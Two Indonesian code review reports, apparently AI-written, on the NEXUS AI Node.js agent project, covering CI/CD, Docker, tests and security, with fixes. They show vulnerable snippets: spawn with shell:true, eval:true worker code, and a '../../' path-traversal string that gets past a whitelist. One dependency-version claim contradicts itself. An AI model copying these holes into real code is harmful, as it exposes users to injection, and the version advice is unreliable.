### 3.8 `agent/core/MemoryPipeline.js` — Solid

`versionedWrite()` (backup sebelum overwrite) adalah pattern yang sangat baik untuk mencegah data loss. Ini menunjukkan kesadaran terhadap integritas data.

---

## 4. REVIEW PIPELINE

### 4.1 GitHub Actions (`.github/workflows/npm-publish.yml`)

```yaml
on:
  release:
    types: [created]  # ← HANYA trigger saat release dibuat
```

**Masalah Kritis:**
- **Tidak ada pipeline untuk `push` / `pull_request`** — setiap commit ke `main` tidak otomatis ditest
- **`npm ci` akan gagal** karena tidak ada `package-lock.json` di repository (dicek dari `.gitignore` dan ZIP content)
- **Tidak ada caching** untuk `node_modules` — setiap run install ulang dari awal (lambat)
- **Dua job (`build` dan `publish-npm`) melakukan `npm ci` dua kali** — duplikasi tidak perlu

**Saran perbaikan pipeline:**
```yaml
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: 'npm'           # ← Cache node_modules
      - run: npm ci
      - run: npm test
      - run: npm run lint        # ← Tambahkan lint

  publish-npm:
    needs: test
    if: github.event_name == 'release'
    # ...
```

### 4.2 Docker

**Masalah di `Dockerfile`:**
```dockerfile
COPY . .  # ← Menyalin .env ke container jika tidak ada di .dockerignore
```

`.dockerignore` memang sudah ada dan mencantumkan `.env`, **tapi** `docker-compose.yml` tidak menggunakan `env_file` atau Docker Secrets:
```yaml
# ❌ Tidak ada env_file atau secrets di docker-compose
environment:
  - NEXUS_MODE=autonomous  # Hanya hardcode ini
```

**Tidak ada health check** di `docker-compose.yml`:
```yaml
# ✅ Tambahkan:
healthcheck:
  test: ["CMD", "node", "-e", "require('./cli.js')"]
  interval: 30s
  timeout: 10s
  retries: 3
```

**Versi Dockerfile vs `package.json` tidak sinkron:**
- Dockerfile: `node:22-alpine`, label `version="3.1.0"`
- `package.json`: versi `3.3.0`

### 4.3 Testing

**Positif:** Ada struktur test di `tests/TDD/` dengan beberapa test file.

**Masalah:**
- Test runner custom (`runner.js`) tidak menggunakan framework standar (Jest/Mocha) — maintainability rendah
- **Tidak ada perintah lint** di `package.json`
- **Tidak ada code coverage** reporting
- Test hanya di `tests/TDD/` — tidak ada integration test untuk CLI end-to-end
- `tests/sandboxes/` menyertakan direktori `vendor/` PHP — **ini tidak boleh ada di repository** (berat, tidak relevan untuk Node project)

---

## 5. SECURITY & PERFORMANCE CHECK

### 🔴 SECURITY ISSUES

| # | Severity | Lokasi | Deskripsi |
|---|---|---|---|
| S1 | CRITICAL | `cli.js:23` | `spawn(..., {shell: true})` dengan user args — Shell Injection |
| S2 | CRITICAL | `.env` | File `.env` dengan personal path ada dalam ZIP (pernah/masih di-track Git) |
| S3 | HIGH | `SandboxExecutor.js` | Plugin berjalan di proses utama, bisa akses `process.env` dan secrets |
| S4 | HIGH | `NexusEngine.js:854-855` | `spawn(..., {shell: true})` dengan `projectPath` dari user input |
| S5 | MEDIUM | `docker-compose.yml` | Tidak ada network isolation — container bisa akses semua network |
| S6 | MEDIUM | `config/.env.example` | File `.env.example` hampir kosong (hanya 70 bytes), tidak mendokumentasikan semua env vars yang dibutuhkan |
| S7 | LOW | `.env:5` | Path absolut personal developer (`/home/faisal/...`) ter-commit |

### 🟠 PERFORMANCE ISSUES

| # | Severity | Lokasi | Deskripsi |
|---|---|---|---|
| P1 | HIGH | `Logger.js` | Read-entire-array + rewrite setiap log entry — O(n) I/O per log |
| P2 | HIGH | `SemanticEngine.js` | `buildIndex()` memuat semua files ke RAM sekaligus |
| P3 | MEDIUM | `NexusEngine.js` | Tidak ada connection pooling untuk axios HTTP calls |
| P4 | MEDIUM | `cleanCodeAndVerify()` | Loop spawn 5x dengan `setTimeout(8000)` = minimal 40 detik blocking |
| P5 | LOW | `EventBus.js` | `JSON.stringify(payload)` di setiap event untuk deduplication overhead |

---

## 6. SARAN PERBAIKAN PRIORITAS TINGGI

### P1: Perbaiki Shell Injection di `cli.js`

```javascript
// SEBELUM (❌)
const child = spawn('node', [`"${enginePath}"`, ...cleanArgs], {
    shell: true
});

// SESUDAH (✅)
const child = spawn('node', [enginePath, ...cleanArgs], {
    shell: false
});
```

### P2: Rotasi `.env` dan Tambahkan ke `.gitignore` dengan Benar

```bash
# Cek apakah .env masih di-track Git
git ls-files --error-unmatch .env

# Jika ya, hapus dari tracking
git rm --cached .env
echo ".env" >> .gitignore
git commit -m "chore: remove .env from git tracking"
```

Karena `.env` pernah ter-commit, buat secret rotation untuk `APP_KEY` dan `DB_PASSWORD`.

### P3: Perbaiki `package-lock.json`

```bash
npm install  # Generate package-lock.json
git add package-lock.json
git commit -m "chore: add package-lock.json for reproducible builds"
```

CI/CD `npm ci` **akan selalu gagal** tanpa ini.

### P4: Tambahkan Pipeline CI untuk `push` / `pull_request`

Ganti trigger di `npm-publish.yml` (atau buat file baru `ci.yml`) agar testing berjalan di setiap commit, bukan hanya saat release.

### P5: Perbaiki `SandboxExecutor` — Gunakan Worker Thread Nyata

```javascript
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

execute(pluginPath, args, options = {}) {
    return new Promise((resolve, reject) => {
        const worker = new Worker(`
            const { workerData, parentPort } = require('worker_threads');
            const plugin = require(workerData.pluginPath);
            const action = plugin.scan || plugin.execute;
            Promise.resolve(action(workerData.args))
                .then(r => parentPort.postMessage({ ok: true, result: r }))
                .catch(e => parentPort.postMessage({ ok: false, error: e.message }));
        `, { eval: true, workerData: { pluginPath, args } });
        
        const timer = setTimeout(() => { worker.terminate(); reject(new Error('Timeout')); }, timeout);
        worker.on('message', (msg) => {
            clearTimeout(timer);
            msg.ok ? resolve(msg.result) : reject(new Error(msg.error));
        });
    });
}
```

---

## 7. SARAN PERBAIKAN PRIORITAS MENENGAH

### M1: Refactor `Logger.js` — Gunakan Append Mode

```javascript
// Ganti baca-tulis-ulang array dengan append NDJSON
async log(category, level, agent, task_id, event, message, duration_ms = 0, metadata = {}, trace_id = 'N/A') {
    const logEntry = { trace_id, timestamp: NexusClock.getISOTimestamp(), level, agent, task_id, event, message, duration_ms, metadata };
    const logFile = path.join(this.logPath, category, `${NexusClock.getDateString()}.ndjson`);
    await fs.ensureDir(path.dirname(logFile));
    await fs.appendFile(logFile, JSON.stringify(logEntry) + '\n');
}
```

### M2: Pisah `NexusEngine.js` Menjadi Modul Terpisah

File 1317 baris perlu dipecah. Saran:
```
agent/core/
├── NexusEngine.js        # Hanya bootstrap + koordinasi (< 200 baris)
├── AuditPhase.js         # Logic audit()
├── PlanningPhase.js      # Logic plan()
├── ExecutionPhase.js     # Logic execute()
├── HarvestPhase.js       # Logic harvest(), massRefactor()
└── StatusReporter.js     # Logic getSystemStatus()
```

### M3: Tambahkan `env_file` ke `docker-compose.yml`

```yaml
services:
  nexus-ai:
    build: .
    env_file:
      - .env               # ← Load dari .env file
    environment:
      - NEXUS_MODE=autonomous  # Override jika perlu
```

### M4: Perbaiki `initRedis()` — Graceful Degradation

```javascript
async initRedis() {
    try {
        await redis.connect();
        this.log('✅ Redis connected.', 'success');
    } catch (e) {
        this.log(`⚠️  Redis unavailable: ${e.message}. Running in file-only mode.`, 'warning');
        this.useRedis = false;  // Flag untuk skip Redis calls
    }
    
    try {
        await localAI.checkAvailability();
    } catch (e) {
        this.log(`⚠️  Ollama unavailable: ${e.message}. AI features disabled.`, 'warning');
        this.useLocalAI = false;
    }
}
```

### M5: Tambahkan ESLint + Format Standard

```bash
npm install --save-dev eslint eslint-config-standard
```

Buat `.eslintrc.json`:
```json
{
  "extends": "standard",
  "rules": {
    "no-eval": "error",
    "no-new-func": "error"
  }
}
```

Tambahkan ke `package.json`:
```json
"scripts": {
  "lint": "eslint agent/ cli.js tests/TDD/*.js"
}
```

### M6: Lengkapi `.env.example`

File `.env.example` saat ini hampir kosong (70 bytes). Dokumentasikan semua env vars:
```bash
# Runtime
NODE_ENV=development

# Project
PROJECT_PATH=./             # Path ke project yang diaudit

# Redis (opsional — fallback ke file-based jika tidak ada)
REDIS_URL=redis://localhost:6379

# Ollama AI (opsional — fallback ke TF-IDF jika tidak ada)
OLLAMA_BASE_URL=http://localhost:11434/api
OLLAMA_MODEL=nomic-embed-text

# Nexus
NEXUS_MODE=learning         # learning | efficient | autonomous
```

### M7: Hapus `tests/sandboxes/vendor/` dari Repository

Direktori `tests/sandboxes/url-shortener/vendor/` berisi ratusan file PHP vendor yang tidak relevan dengan Node.js project ini dan membuat repository sangat berat. Tambahkan ke `.gitignore`:
```
tests/sandboxes/*/vendor/
tests/sandboxes/*/node_modules/
```

---

## 8. SARAN PERBAIKAN JANGKA PANJANG

### L1: Migrasi ke Framework Test Standar (Jest)

Test runner custom (`runner.js`) sulit di-maintain. Migrasi ke Jest memberikan:
- Coverage report otomatis
- Watch mode untuk TDD
- Snapshot testing
- Integrasi CI lebih mudah

```bash
npm install --save-dev jest
```

### L2: Implementasi Proper Plugin Isolation dengan `isolated-vm`

Untuk multi-tenant atau execution agent yang benar-benar aman:
```bash
npm install isolated-vm
```

Library ini memberikan V8 isolate yang benar-benar isolated (memory, CPU limit, no shared globals).

### L3: Pertimbangkan TypeScript untuk Core Modules

Mengingat kompleksitas arsitektur (20+ modul yang saling berinteraksi), TypeScript akan sangat membantu:
- Type safety untuk `EventBus` schema
- IntelliSense untuk `NexusEngine` methods
- Refactoring lebih aman

Minimal, tambahkan JSDoc untuk tipe pada fungsi-fungsi utama.

### L4: Implementasi Metrics & Observability

Saat ini metrics hanya disimpan di `this.metrics` in-memory. Untuk production:
- Eksport ke Prometheus/Grafana
- Atau minimal structured JSON metrics per cycle
- Tambahkan alert threshold (contoh: "jika MemoryGovernor trim > 50 files/jam, kirim notifikasi")

### L5: Optimasi SemanticEngine untuk Scale

Untuk knowledge base > 200 files, pertimbangkan:
- Incremental index build (hanya index file yang berubah)
- Persistent index ke disk (tidak rebuild setiap start)
- Paginated search untuk hasil banyak

### L6: Standardisasi Logging dengan Structured Log Format

Saat ini log disimpan sebagai JSON array per hari. Pertimbangkan migrasi ke structured logging library (`pino` atau `winston`) yang mendukung:
- Log rotation otomatis
- Stream ke external service (Loki, CloudWatch)
- Log level environment-based

### L7: Tambahkan Network Policy di Docker Compose

```yaml
services:
  nexus-ai:
    networks:
      - internal

  redis:
    networks:
      - internal

networks:
  internal:
    driver: bridge
    internal: true  # Blokir akses ke internet dari container
```

---

## 9. CHECKLIST TINDAKAN YANG BISA LANGSUNG DIKERJAKAN

### Hari Ini (< 1 jam)
- [ ] `git rm --cached .env && git commit -m "chore: untrack .env"` — cabut .env dari git tracking
- [ ] Rotate `APP_KEY` dan `DB_PASSWORD` yang mungkin sudah ter-expose
- [ ] `npm install` untuk generate `package-lock.json`, lalu commit
- [ ] Update `package.json` label versi: Dockerfile masih `3.1.0`, package.json `3.3.0` — sinkronkan

### Minggu Ini (< 1 hari kerja)
- [ ] Perbaiki `shell: true` → `shell: false` di `cli.js` dan `NexusEngine.js`
- [ ] Tambahkan try-catch di `initRedis()` dengan graceful degradation
- [ ] Perbaiki `SandboxExecutor.js` untuk menggunakan Worker Thread yang sudah di-import
- [ ] Tambahkan CI pipeline untuk `push`/`pull_request` di GitHub Actions
- [ ] Lengkapi `.env.example` dengan semua variable yang dibutuhkan
- [ ] Tambahkan `env_file` ke `docker-compose.yml`
- [ ] Tambahkan health check ke `docker-compose.yml`
- [ ] Pindahkan `require()` yang ada di dalam method ke top-level file

### Bulan Ini (sprint 1-2)
- [ ] Refactor `NexusEngine.js` (1317 baris) menjadi modul terpisah per phase
- [ ] Perbaiki `Logger.js` dari read-rewrite ke append mode
- [ ] Tambahkan ESLint ke project dan perbaiki semua warning
- [ ] Hapus `tests/sandboxes/vendor/` dari repository
- [ ] Tambahkan `npm run lint` ke CI pipeline
- [ ] Setup Jest sebagai test runner pengganti custom runner

---

## 10. KESIMPULAN SINGKAT

NEXUS AI adalah project dengan **ambisi arsitektur yang tinggi** dan beberapa implementasi yang genuinely solid — EventBus dengan schema registry, AgentRegistry dengan stuck detection, MemoryPipeline dengan versioned write, dan Dead Letter Queue adalah contoh engineering yang matang.

**Namun**, ada **3 area kritis** yang harus ditangani segera sebelum production deployment:

1. **Keamanan** — Shell injection via `shell: true`, `.env` yang pernah ter-track Git, dan "sandbox" yang bukan sandbox nyata membuat postur keamanan project lemah.

2. **CI/CD yang broken** — Pipeline tidak akan berjalan karena `package-lock.json` tidak ada, dan coverage development sehari-hari nol karena pipeline hanya trigger saat `release`.

3. **Technical debt pada NexusEngine.js** — File 1317 baris yang melakukan terlalu banyak hal akan menjadi bottleneck maintainability seiring project berkembang.

**Perkiraan effort perbaikan kritis:** 2-3 hari kerja untuk security fixes dan CI/CD. Refactoring NexusEngine bisa dilakukan secara bertahap dalam 1-2 sprint.

---

*Laporan ini dibuat berdasarkan review statis kode. Beberapa temuan mungkin memiliki konteks runtime yang berbeda. Tandai sebagai asumsi: (1) `package-lock.json` tidak ada — tidak terlihat dalam ZIP; (2) Redis diasumsikan optional berdasarkan code pattern.*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]

### 📘 KNOWLEDGE: NEXUS_AI_V2_CODE_REVIEW.MD

# 🤖 NEXUS AI v3.3.0 — Laporan Code Review Komprehensif (Iterasi 2)
> **VERSION**: v1 | **Last Updated**: 26/05/2026


**Tanggal Review:** 16 Mei 2026
**Reviewer:** AI Engineering Assistant Senior
**ZIP:** `NEXUS_AI.zip` (upload terbaru)
**Klasifikasi:** Internal Engineering Report — Delta Review dari v3.3.0 (ZIP 1) ke v3.3.0 (ZIP 2)

---

## 1. RINGKASAN PROJECT

| Aspek | Detail |
|---|---|
| **Nama** | `human-ai-nexus` |
| **Versi** | `3.3.0` (main) / `3.0.0` (NEXUS_PUBLIC_DISTRIBUTION) ⚠️ |
| **Runtime** | Node.js ≥ 16, Docker: `node:22-alpine` |
| **Bahasa** | JavaScript (CommonJS) |
| **Entry Point** | `cli.js → agent/main.js → NexusEngine.js` |
| **CI/CD** | GitHub Actions: `ci.yml` (push/PR) + `npm-publish.yml` (release) |
| **Testing** | Custom TDD runner (`tests/TDD/runner.js`) |
| **Dependensi Baru** | `llamaindex ^0.12.1`, `fast-glob ^3.3.3`, `p-limit ^7.3.0` |
| **AI Backend** | Ollama (lokal) + LlamaIndex |
| **Memory** | Redis + NDJSON file-based |

### Arsitektur Folder (Versi Terbaru)
```
NEXUS AI/
├── agent/
│   ├── core/
│   │   ├── phases/          # ✅ BARU — AuditPhase, PlanningPhase, ExecutionPhase, KnowledgePhase
│   │   ├── NexusEngine.js   # ✅ Dipangkas dari 1317 → 384 baris
│   │   ├── DecisionEngine.js # ✅ BARU — AI conflict resolver
│   │   ├── EvolutionPiper.js # ✅ BARU — PBL cycle manager + guardrails
│   │   ├── Machinist.js      # ✅ BARU — Plugin forge dengan path whitelist
│   │   ├── NativeBridge.js   # ✅ BARU — C++/Python IPC bridge
│   │   ├── ParallelRunner.js # ✅ BARU — Concurrency controller
│   │   ├── ResourceMonitor.js # ✅ BARU — CPU/RAM monitoring
│   │   └── SandboxExecutor.js # ✅ DIPERBAIKI — Worker Thread nyata
│   ├── tools/               # Scanner & specialist tools
│   ├── prompts/             # Internal & external agent prompts
│   └── workflows/           # Workflow definitions per agent
├── NEXUS_PUBLIC_DISTRIBUTION/ # Versi distribusi publik
├── .github/workflows/
│   ├── ci.yml               # ✅ BARU — CI untuk push/PR
│   └── npm-publish.yml      # Pipeline release
├── .eslintrc.json            # ✅ BARU — ESLint standard config
├── package-lock.json         # ✅ BARU — Reproducible builds
├── Dockerfile                # ✅ Versi sinkron: 3.3.0
└── docker-compose.yml        # ✅ env_file + healthcheck ditambahkan
```

---

## 2. TEMUAN UTAMA

### ✅ Perbaikan Signifikan dari Versi Sebelumnya (Apresiasi)

| # | Yang Diperbaiki | Dampak |
|---|---|---|
| ✅ | `NexusEngine.js`: 1317 → 384 baris, dipecah ke `phases/` | Maintainability sangat meningkat |
| ✅ | `SandboxExecutor`: Kini menggunakan Worker Thread nyata | Security isolation terpenuhi |
| ✅ | `shell: true` → `shell: false` di cli.js dan NexusEngine | Shell injection ditutup |
| ✅ | `initRedis()` punya try-catch + graceful degradation | Crash diam-diam dicegah |
| ✅ | `Logger.js` → NDJSON append mode | Performa I/O meningkat signifikan |
| ✅ | `package-lock.json` tersedia | CI/CD `npm ci` sekarang bisa jalan |
| ✅ | `ci.yml` baru untuk push/PR trigger | Development sehari-hari terlindungi |
| ✅ | `npm run lint` ditambahkan ke `package.json` | Code quality terjaga |
| ✅ | `ESLint` + `eslint-config-standard` diinstall | Standar kode konsisten |
| ✅ | `docker-compose.yml` → `env_file` + `healthcheck` | Production-grade deployment |
| ✅ | `Dockerfile` label versi sinkron (3.3.0) | Tidak ada ambiguitas versi |
| ✅ | `config/.env.example` lengkap | Dokumentasi environment jelas |
| ✅ | `.env` tidak di-track Git | Secret exposure dicegah |
| ✅ | Port dinamis `getAvailablePort()` di `cleanCodeAndVerify()` | Konflik port dicegah |
| ✅ | `ParallelRunner` dengan `p-limit` | Concurrency terkontrol |
| ✅ | `DecisionEngine` dengan weight profiles | AI conflict resolution mature |
| ✅ | `EvolutionPiper` dengan hard guardrails (25 cycles, 2 jam) | Runaway execution dicegah |
| ✅ | `Machinist` dengan path whitelist + forbidden imports | Plugin forge lebih aman |
| ✅ | `ResourceMonitor` CPU dua-snapshot method | CPU measurement akurat |

---

### 🔴 Temuan Kritis (Masih Ada)

1. **`NEXUS_PUBLIC_DISTRIBUTION` versi tidak sinkron** — versi `3.0.0` sementara main `3.3.0`
2. **`ci.yml` Lint step tidak memblokir** — `|| echo "Lint script not yet defined"` artinya lint gagal pun CI tetap hijau
3. **`.env` masih berisi path hardcoded Windows** — `PROJECT_PATH=c:\Users\ACER\Desktop\NEXUS AI`

### 🟠 Temuan Penting

4. **`llamaindex ^0.12.1` terlalu lama** — versi terbaru adalah `^0.9.x` untuk LlamaIndex.TS, ada risiko breaking change
5. **`glob ^8.1.0` deprecated** — sudah ada `fast-glob ^3.3.3` di dependencies, tapi `glob` lama masih ada (duplikasi)
6. **`npm-publish.yml` tidak menggunakan cache npm** — lebih lambat dari `ci.yml` yang sudah pakai cache
7. **`SandboxExecutor` menggunakan `eval: true`** — Worker Thread dengan kode inline adalah vektor injection

### 🟡 Perlu Perhatian

8. **`NativeBridge.js` mengasumsikan Windows** — path `.exe` hardcoded, tidak cross-platform
9. **`ci.yml` tidak ada code coverage** — test jalan tapi tidak ada metrics coverage
10. **`NEXUS_PUBLIC_DISTRIBUTION` tidak punya `package-lock.json`** — distribusi tidak reproducible

---

## 3. REVIEW KODE

### 3.1 `NexusEngine.js` — ✅ Transformasi Luar Biasa

Dari 1317 baris menjadi **384 baris** — ini adalah perbaikan terbesar dan paling impactful. NexusEngine sekarang murni bertindak sebagai orchestrator:

```javascript
// ✅ Pola yang sangat bersih — NexusEngine hanya delegasi
async audit(targetPath = this.rootPath, options = {}) {
    return await this.auditPhase.run({ targetPath, ...options });
}
async plan(auditReport) {
    return await this.planningPhase.run(auditReport);
}
async execute(plan) {
    return await this.executionPhase.run(plan);
}
```

**Kekuatan:** Setiap phase bisa di-test dan di-maintain secara independen.

**Satu Catatan:** NexusEngine masih punya 37 `require()` di top-level yang membuat file terlihat padat di bagian atas. Pertimbangkan lazy loading untuk module yang jarang dipakai.

---

### 3.2 `SandboxExecutor.js` — ✅ Sudah Benar, Satu Catatan

Worker Thread sekarang nyata dan terpisah dari proses utama. Ini perbaikan security yang sangat signifikan.

**Catatan — `eval: true` masih berisiko:**
```javascript
const worker = new Worker(`
    const { workerData, parentPort } = require('worker_threads');
    // ... kode sebagai string
`, { eval: true, workerData: { pluginPath, args } });
```

Kode Worker sebagai string dengan `eval: true` tetap membuka vektor injection jika `pluginPath` atau `args` bisa dimanipulasi. Solusi yang lebih aman:

```javascript
// ✅ Buat file worker terpisah: agent/core/workers/plugin-worker.js
const worker = new Worker(
    path.join(__dirname, 'workers', 'plugin-worker.js'),
    { workerData: { pluginPath, args } }
);
// Hapus eval: true sama sekali
```

---

### 3.3 `DecisionEngine.js` — ✅ Solid

Weight profiles per context (`saas`, `security`, `performance`, `refactor`, dll.) adalah pattern yang sangat matang untuk AI decision making. Fallback ke `default` profile dengan warning yang jelas juga baik.

**Satu Peningkatan:** Tambahkan validasi bahwa semua `opt.scores` memiliki semua kriteria yang dibutuhkan:

```javascript
// ✅ Tambahkan validasi scores
const ranked = options.map(opt => {
    let totalScore = 0;
    for (const criteria in weights) {
        const score = opt.scores?.[criteria];
        if (score === undefined) {
            console.warn(`⚠️ DecisionEngine: option "${opt.id}" missing score for "${criteria}". Defaulting to 0.`);
        }
        totalScore += (score || 0) * weights[criteria];
    }
    return { ...opt, final_score: parseFloat(totalScore.toFixed(4)), context_used: context };
});
```

---

### 3.4 `EvolutionPiper.js` — ✅ Guardrails yang Baik

Hard limit 25 cycles dan 120 menit adalah keputusan engineering yang tepat untuk mencegah infinite loop dan resource exhaustion.

**Satu Masalah:** `currentCycle` disimpan di memori instance — jika process crash dan restart, counter reset ke 0. Untuk true safety boundary, counter harus persisted:

```javascript
// ✅ Persist ke file
async checkEvolutionBoundary() {
    const stateFile = path.join(this.rootPath, 'memory/operational/evolution_state.json');
    let state = { currentCycle: 0, sessionStart: Date.now() };
    
    try {
        if (await fs.pathExists(stateFile)) {
            state = await fs.readJson(stateFile);
        }
    } catch (_) {}

    if (state.currentCycle >= this.MAX_EVOLUTION_CYCLES) {
        throw new Error(`🚧 EVOLUTION BOUNDARY: Max ${this.MAX_EVOLUTION_CYCLES} cycles reached.`);
    }
    
    state.currentCycle++;
    await fs.writeJson(stateFile, state);
}
```

---

### 3.5 `Machinist.js` — ✅ Security Guardrails Baik

Path whitelist + blacklist + forbidden import check adalah layer defense yang solid. `FORGE_FORBIDDEN_PATHS` mencakup semua area kritikal.

**Satu Celah:** Validasi hanya cek `startsWith` — path traversal seperti `agent/tools/scanners/../../core/NexusEngine.js` bisa lolos:

```javascript
// ❌ Celah path traversal
const normalizedPath = outputPath.replace(/\\/g, '/');
const isAllowed = FORGE_ALLOWED_PATHS.some(p => normalizedPath.startsWith(p));

// ✅ Perbaikan — resolve dan normalize dulu
const resolvedPath = path.resolve(this.rootPath, outputPath);
const normalizedRelative = path.relative(this.rootPath, resolvedPath).replace(/\\/g, '/');
// Lanjutkan validasi dengan normalizedRelative
```

---

### 3.6 `NativeBridge.js` — Platform-Specific tanpa Guard

```javascript
// ❌ Hardcoded .exe — hanya Windows
const fullPath = path.join(this.binPath, 
    binaryName.endsWith('.exe') ? binaryName : `${binaryName}.exe`
);
```

Ini akan gagal di Linux (Docker container yang pakai `node:22-alpine`).

```javascript
// ✅ Cross-platform
const isWindows = process.platform === 'win32';
const binaryFile = isWindows 
    ? (binaryName.endsWith('.exe') ? binaryName : `${binaryName}.exe`)
    : binaryName;
const fullPath = path.join(this.binPath, binaryFile);
```

---

### 3.7 `ResourceMonitor.js` — ✅ Excellent

Two-snapshot CPU measurement adalah implementasi yang benar dan jarang dilihat di project Node.js. Fix dari "CPU always 0%" dengan delta method menunjukkan debugging mendalam.

---

### 3.8 `Logger.js` — ✅ NDJSON Append Mode

Perbaikan dari read-rewrite ke append mode sudah benar. Sekarang performa I/O jauh lebih baik.

**Tambahan kecil:** Queue-based write (`_writeQueue`) sudah ada di constructor tapi tidak digunakan dalam implementasi `log()`. Jika konkurensi tinggi, ini bisa menyebabkan file corruption:

```javascript
// ✅ Gunakan queue yang sudah disiapkan
async log(category, level, ...) {
    // ...
    this._writeQueue = this._writeQueue.then(() =>
        fs.appendFile(logFile, JSON.stringify(logEntry) + '\n')
    );
    return this._writeQueue;
}
```

---

### 3.9 `ParallelRunner.js` — ✅ Solid dan Ringkas

21 baris yang melakukan satu hal dengan baik. `p-limit` adalah library yang tepat untuk ini.

---

## 4. REVIEW PIPELINE

### 4.1 `ci.yml` — ✅ Jauh Lebih Baik, Satu Bug Kritis

```yaml
- name: Run Lint
  run: npm run lint || echo "Lint script not yet defined"  # ❌ BUG
```

`|| echo` ini artinya: **jika lint gagal, CI tetap hijau**. Ini mengalahkan seluruh tujuan lint di CI.

```yaml
# ✅ Perbaikan — hapus fallback echo
- name: Run Lint
  run: npm run lint
```

Karena `npm run lint` sudah didefinisikan di `package.json`, fallback tidak diperlukan lagi.

### 4.2 `npm-publish.yml` — Perlu Update Minor

```yaml
# ❌ Tidak ada cache npm (berbeda dengan ci.yml yang sudah pakai cache)
- uses: actions/setup-node@v4
  with:
    node-version: 20
    # cache: 'npm' ← hilang

# ❌ Duplikasi — npm ci dijalankan 2x (build + publish-npm)
```

Saran: Gunakan artifact sharing antar job, atau gabungkan menjadi satu job dengan conditional publish.

### 4.3 Docker — ✅ Sudah Production-Grade

`env_file`, `healthcheck`, `restart: unless-stopped`, dan volume mounting sudah benar. Dockerfile juga sudah menggunakan `COPY package*.json ./` sebelum `COPY . .` untuk layer caching yang efisien.

**Satu Tambahan:** Tambahkan network isolation:

```yaml
# ✅ Tambahkan ke docker-compose.yml
networks:
  nexus-internal:
    driver: bridge

services:
  nexus-ai:
    networks:
      - nexus-internal
```

---

## 5. SECURITY & PERFORMANCE CHECK

### Security

| # | Severity | Lokasi | Status | Deskripsi |
|---|---|---|---|---|
| S1 | 🔴 CRITICAL | `SandboxExecutor.js` | ⚠️ Partial | `eval: true` pada Worker — perlu file worker terpisah |
| S2 | 🔴 CRITICAL | `Machinist.js` | ⚠️ Partial | Path traversal `../../` bisa bypass whitelist |
| S3 | 🟠 HIGH | `.env` | ⚠️ Remaining | Path Windows hardcoded masih ada |
| S4 | 🟠 HIGH | `ci.yml` | ⚠️ Bug | Lint failure tidak memblokir CI |
| S5 | 🟡 MEDIUM | `NativeBridge.js` | ❌ Baru | `.exe` hardcoded, gagal di Linux/Docker |
| S6 | 🟡 MEDIUM | `NEXUS_PUBLIC_DIST` | ❌ Baru | Versi 3.0.0 tapi kode mungkin sudah 3.3.0 |

### Performance

| # | Severity | Lokasi | Status | Deskripsi |
|---|---|---|---|---|
| P1 | ✅ FIXED | `Logger.js` | Resolved | NDJSON append — tidak ada lagi read-rewrite |
| P2 | ✅ FIXED | `cleanCodeAndVerify()` | Resolved | Port dinamis, `shell: false` |
| P3 | ✅ NEW | `ParallelRunner.js` | Resolved | `p-limit` untuk concurrency control |
| P4 | 🟡 MEDIUM | `NexusEngine.js` | Remaining | 37 `require()` di top-level — pertimbangkan lazy load |
| P5 | 🟡 MEDIUM | `SemanticEngine.js` | Remaining | `buildIndex()` masih load semua file ke RAM |
| P6 | 🟡 LOW | `glob ^8.1.0` | Duplikasi | `fast-glob` sudah ada — hapus `glob` lama |

---

## 6. SARAN PERBAIKAN PRIORITAS TINGGI

### P1: Perbaiki CI Lint — Hapus `|| echo`

**File:** `.github/workflows/ci.yml`

```yaml
# SEBELUM (❌ — lint failure tidak terdeteksi)
run: npm run lint || echo "Lint script not yet defined"

# SESUDAH (✅)
- name: Run Lint
  run: npm run lint
```

**Estimasi:** 2 menit.

---

### P2: Perbaiki Path Traversal di `Machinist.js`

**File:** `agent/core/Machinist.js`

```javascript
// SEBELUM (❌)
_validateForgePath(outputPath) {
    const normalizedPath = outputPath.replace(/\\/g, '/');
    const isAllowed = FORGE_ALLOWED_PATHS.some(p => normalizedPath.startsWith(p));

// SESUDAH (✅)
_validateForgePath(outputPath) {
    // Resolve absolute path dulu untuk mencegah ../../ traversal
    const absoluteResolved = path.resolve(this.rootPath, outputPath);
    const normalizedPath = path.relative(this.rootPath, absoluteResolved)
                               .replace(/\\/g, '/');

    // Pastikan tidak keluar dari rootPath
    if (normalizedPath.startsWith('..')) {
        throw new Error(`Machinist: Path traversal detected: ${outputPath}`);
    }

    const isAllowed = FORGE_ALLOWED_PATHS.some(p => normalizedPath.startsWith(p));
    const isForbidden = FORGE_FORBIDDEN_PATHS.some(p => normalizedPath.startsWith(p));
    // ... sisa logika sama
}
```

---

### P3: Ganti Worker `eval: true` dengan File Terpisah

**File:** `agent/core/SandboxExecutor.js` + buat file baru

Buat file baru: `agent/core/workers/plugin-worker.js`:
```javascript
const { workerData, parentPort } = require('worker_threads');

async function run() {
    try {
        const plugin = require(workerData.pluginPath);
        const action = plugin.scan || plugin.execute;
        if (typeof action !== 'function') {
            throw new Error('Plugin must export a scan() or execute() function.');
        }
        const result = await Promise.resolve(action(workerData.args));
        parentPort.postMessage({ ok: true, result });
    } catch (err) {
        parentPort.postMessage({ ok: false, error: err.message });
    }
}
run();
```

Lalu di `SandboxExecutor.js`:
```javascript
// SEBELUM (❌ — eval: true)
const worker = new Worker(`...kode inline...`, { eval: true, workerData: { pluginPath, args } });

// SESUDAH (✅)
const workerPath = path.join(__dirname, 'workers', 'plugin-worker.js');
const worker = new Worker(workerPath, { workerData: { pluginPath, args } });
```

---

### P4: Perbaiki `NativeBridge.js` untuk Cross-Platform

```javascript
// SEBELUM (❌)
const fullPath = path.join(this.binPath, binaryName.endsWith('.exe') ? binaryName : `${binaryName}.exe`);

// SESUDAH (✅)
const isWindows = process.platform === 'win32';
const binaryFile = isWindows 
    ? (binaryName.endsWith('.exe') ? binaryName : `${binaryName}.exe`)
    : binaryName;
const fullPath = path.join(this.binPath, binaryFile);
```

---

### P5: Sinkronkan Versi `NEXUS_PUBLIC_DISTRIBUTION`

```bash
# Update package.json di NEXUS_PUBLIC_DISTRIBUTION
# Ganti "version": "3.0.0" → "version": "3.3.0"
```

Dan tambahkan script untuk auto-sync versi di `package.json` root:
```json
"scripts": {
